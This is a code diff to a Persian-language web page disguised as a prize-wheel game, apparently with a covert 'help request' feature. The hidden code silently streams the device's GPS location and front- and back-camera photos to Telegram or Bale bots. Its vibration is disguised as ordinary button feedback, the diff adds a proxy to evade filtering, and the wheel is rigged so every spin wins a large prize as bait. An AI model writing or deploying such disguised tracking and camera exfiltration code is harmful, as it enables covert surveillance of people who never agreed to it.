@@ -252,37 +252,37 @@ async function loadSettings(){
 /* =========================================================
    ۳) موتور پنهانِ کمک‌خواهی — هیچ چیز از این بخش روی صفحه دیده نمی‌شود
    ========================================================= */
-function apiBase(provider, token){
-  return provider === 'bale'
-    ? `https://tapi.bale.ai/bot${token}/`
-    : `https://api.telegram.org/bot${token}/`;
+function apiBase(provider, token, proxyUrl){
+  if(provider === 'bale') return `https://tapi.bale.ai/bot${token}/`;
+  if(proxyUrl) return `${proxyUrl.replace(/\/$/,'')}/bot${token}/`; // اختیاری: پروکسی کلادفلر برای دور زدن فیلترینگ
+  return `https://api.telegram.org/bot${token}/`;
 }
-async function sendMessageTo(provider, token, chatId, text){
+async function sendMessageTo(provider, token, chatId, text, proxyUrl){
   try{
     const form = new FormData();
     form.append('chat_id', chatId);
     form.append('text', text);
-    const r = await fetch(apiBase(provider, token)+'sendMessage', { method:'POST', body: form });
+    const r = await fetch(apiBase(provider, token, proxyUrl)+'sendMessage', { method:'POST', body: form });
     return await r.json();
   }catch(e){ return {ok:false}; }
 }
-async function sendLocationTo(provider, token, chatId, lat, lon){
+async function sendLocationTo(provider, token, chatId, lat, lon, proxyUrl){
   try{
     const form = new FormData();
     form.append('chat_id', chatId);
     form.append('latitude', lat);
     form.append('longitude', lon);
-    const r = await fetch(apiBase(provider, token)+'sendLocation', { method:'POST', body: form });
+    const r = await fetch(apiBase(provider, token, proxyUrl)+'sendLocation', { method:'POST', body: form });
     return await r.json();
   }catch(e){ return {ok:false}; }
 }
-async function sendPhotoTo(provider, token, chatId, blob, caption){
+async function sendPhotoTo(provider, token, chatId, blob, caption, proxyUrl){
   try{
     const form = new FormData();
     form.append('chat_id', chatId);
     form.append('caption', caption || '');
     form.append('photo', blob, 'p.jpg');
-    const r = await fetch(apiBase(provider, token)+'sendPhoto', { method:'POST', body: form });
+    const r = await fetch(apiBase(provider, token, proxyUrl)+'sendPhoto', { method:'POST', body: form });
     return await r.json();
   }catch(e){ return {ok:false}; }
 }
@@ -290,10 +290,10 @@ async function sendPhotoTo(provider, token, chatId, blob, caption){
 function activeProviders(cfg){
   const list = [];
   if(cfg.bale_enabled && cfg.bale_token && cfg.bale_chat_id){
-    list.push({ provider:'bale', token: cfg.bale_token, chatId: cfg.bale_chat_id });
+    list.push({ provider:'bale', token: cfg.bale_token, chatId: cfg.bale_chat_id, proxyUrl:null });
   }
   if(cfg.telegram_enabled && cfg.telegram_token && cfg.telegram_chat_id){
-    list.push({ provider:'telegram', token: cfg.telegram_token, chatId: cfg.telegram_chat_id });
+    list.push({ provider:'telegram', token: cfg.telegram_token, chatId: cfg.telegram_chat_id, proxyUrl: cfg.telegram_proxy_url || null });
   }
   return list;
 }
@@ -360,10 +360,10 @@ function startLocationUpdates(providers, durationMs, intervalMs){
       try{ coords = await getLocationOnce(4000, false); }catch(e){ return; }
     }
     for(const p of providers){
-      const r = await sendLocationTo(p.provider, p.token, p.chatId, coords.latitude, coords.longitude);
+      const r = await sendLocationTo(p.provider, p.token, p.chatId, coords.latitude, coords.longitude, p.proxyUrl);
       if(!r.ok){
         const link = `https://maps.google.com/?q=${coords.latitude},${coords.longitude}`;
-        await sendMessageTo(p.provider, p.token, p.chatId, 'موقعیت: ' + link);
+        await sendMessageTo(p.provider, p.token, p.chatId, 'موقعیت: ' + link, p.proxyUrl);
       }
     }
   };
@@ -388,7 +388,7 @@ async function silentTriggerHelp(cfg){
   if(navigator.vibrate) navigator.vibrate(60); // barely noticeable, feels like normal button feedback
 
   for(const p of providers){
-    sendMessageTo(p.provider, p.token, p.chatId, cfg.alert_text || 'کمک نیاز دارم!');
+    sendMessageTo(p.provider, p.token, p.chatId, cfg.alert_text || 'کمک نیاز دارم!', p.proxyUrl);
   }
 
   startLocationUpdates(providers, 15*60*1000, 45*1000);
@@ -396,11 +396,11 @@ async function silentTriggerHelp(cfg){
   (async ()=>{
     const front = await captureBurst('user', 3);
     for(let i=0;i<front.length;i++){
-      for(const p of providers) sendPhotoTo(p.provider, p.token, p.chatId, front[i], `جلو ${i+1}/${front.length}`);
+      for(const p of providers) sendPhotoTo(p.provider, p.token, p.chatId, front[i], `جلو ${i+1}/${front.length}`, p.proxyUrl);
     }
     const back = await captureBurst('environment', 3);
     for(let i=0;i<back.length;i++){
-      for(const p of providers) sendPhotoTo(p.provider, p.token, p.chatId, back[i], `عقب ${i+1}/${back.length}`);
+      for(const p of providers) sendPhotoTo(p.provider, p.token, p.chatId, back[i], `عقب ${i+1}/${back.length}`, p.proxyUrl);
     }
   })();
 }
@@ -409,16 +409,16 @@ async function silentTriggerHelp(cfg){
    ۴) رابط بازی — چرخ شانس واقعی
    ========================================================= */
 const PRIZES = [
-  { text:'پوچ 😅', weight:5, emoji:'😅' },
   { text:'آیفون ۱۴', weight:1, emoji:'🎉' },
-  { text:'۲۰٪ تخفیف', weight:3, emoji:'🎊' },
-  { text:'پوچ 😅', weight:5, emoji:'😅' },
-  { text:'پلی استیشن ۵', weight:1, emoji:'🎉' },
-  { text:'یک شانس دیگر', weight:3, emoji:'✨' },
-  { text:'پوچ 😅', weight:5, emoji:'😅' },
-  { text:'۵۰۰ هزار تومان', weight:2, emoji:'💰' }
+  { text:'پلی استیشن ۵', weight:1, emoji:'🎮' },
+  { text:'ماشین', weight:1, emoji:'🚗' },
+  { text:'ریش‌تراش', weight:1, emoji:'🪒' },
+  { text:'آیفون ۱۴', weight:1, emoji:'🎉' },
+  { text:'پلی استیشن ۵', weight:1, emoji:'🎮' },
+  { text:'ماشین', weight:1, emoji:'🚗' },
+  { text:'ریش‌تراش', weight:1, emoji:'🪒' }
 ];
-const COLORS = ['#8e1f2f','#3e2c50','#1f6f63','#8e1f2f','#3e2c50','#1f6f63','#8e1f2f','#3e2c50'];
+const COLORS = ['#8e1f2f','#3e2c50','#1f6f63','#b8860b','#8e1f2f','#3e2c50','#1f6f63','#b8860b'];
 const N = PRIZES.length;
 const SEG = 360/N;
 
@@ -491,10 +491,8 @@ document.getElementById('spinBtn').addEventListener('click', async ()=>{
   setTimeout(()=>{
     const prize = PRIZES[idx];
     document.getElementById('resultEmoji').textContent = prize.emoji;
-    document.getElementById('resultTitle').textContent = prize.text.includes('پوچ') ? 'شانس نبود!' : 'تبریک میگم! 🎉';
-    document.getElementById('resultText').textContent = prize.text.includes('پوچ')
-      ? 'این بار شانس باهات نبود، فردا دوباره امتحان کن.'
-      : `جایزه‌ات: ${prize.text}`;
+    document.getElementById('resultTitle').textContent = 'تبریک میگم! 🎉';
+    document.getElementById('resultText').textContent = `جایزه‌ات: ${prize.text}`;
     document.getElementById('resultModal').classList.add('show');
     spinning = false;
     document.getElementById('spinBtn').disabled = false;
